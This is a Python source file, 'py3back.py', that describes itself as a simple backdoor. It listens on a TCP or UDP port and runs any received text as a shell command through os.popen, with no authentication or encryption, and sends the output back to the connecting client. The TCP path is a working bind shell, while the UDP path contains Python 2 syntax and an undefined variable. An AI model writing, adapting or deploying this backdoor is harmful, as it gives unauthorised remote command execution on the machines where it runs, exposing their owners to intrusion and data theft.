#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  py3back.py
#  
#  Copyright 2016 DockTownMayor <DockTownMayor@Host>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

# Small simplistic python backdoor.
# Features: ipv4/ipv6, udp/tcp, no encryption, no auth, multi connection support, semi-interactive shell.

def tcpClient(connection, client_address, debug, interactive, bufferSize, encoding):
	try:
		if debug is True:
			print ("A new optimist has joined our ranks: " + client_address[0])
		while True:
			d = connection.recv(bufferSize)
			if d:
				if "exit" in str(d):
					break
				elif "interactive" in str(d):
					if interactive is False:
						interactive = True
					else:
						interactive = False
				else:
					a = os.popen(str(d)[2:len(str(d)[1:])-4],"r") # Telnet is a bitch.
					if interactive is True:
						while True:
							l = a.readline()
							if not l: break
							connection.send(l.encode(encoding))
			else:
				if debug is True:
					print ("A moment of silence for our lost one named: " + client_address[0])
				break
	finally:
		connection.close()
	if debug is True:
		print ("One of our dear friends has just left us, he was called: " + client_address[0])
	return 0

def main(args):
	debug = True
	interactive = True
	ipversion = 6 # add argv config so this becomes default config when args arent supplied for easy use
	port = 48326
	bufferSize = 4096
	encoding = 'utf-8'
	host = "::1"
	protocol = "tcp"
	afnet = socket.AF_INET6
	socku = socket.SOCK_STREAM
	if ipversion is 4:
		host = "localhost"
		afnet = socket.AF_INET
	if "udp" in protocol:
		socku = socket.SOCK_DGRAM
	sock = socket.socket(afnet, socku)
	server_address = (host, port)
	sock.bind(server_address)
	if "udp" not in protocol:
		sock.listen(1)
	if debug is True:
		print ("Finding the light!")
	while True:
		if "udp" not in protocol:
			connection, client_address = sock.accept()
			# Here we add a thread
			try:
				_thread.start_new_thread(tcpClient, (connection, client_address, debug, interactive, bufferSize, encoding)) # I'm very lazy.
			except Exception as e:
				if debug is True:
					print >>sys.stderr, "Could not guide in the light: ", e
		else:
			try:
				while True:
					d, client_address = sock.recvfrom(bufferSize)
					if debug is True:
						print >>sys.stdout, "A new optimist has joined our ranks: ", client_address
					if d:
						if "exit" in d:
							break
						if "interactive" in d:
							if interactive is False:
								interactive = True
							else:
								interactive = False
						a = os.popen(d,"r")
						if interactive is True:
							while True:
								l = a.readline()
								if not l: break
								connection.send(l.encode(encoding))
					else:
						if debug is True:
							print >>sys.stdout, "A moment of silence for our lost one named: ", client_address
						break
            
			finally:
				connection.close()
	if debug is True:
		print ("Going dark!")
	return 0

if __name__ == '__main__':
    import sys
    import socket
    import os
    import _thread
    sys.exit(main(sys.argv))
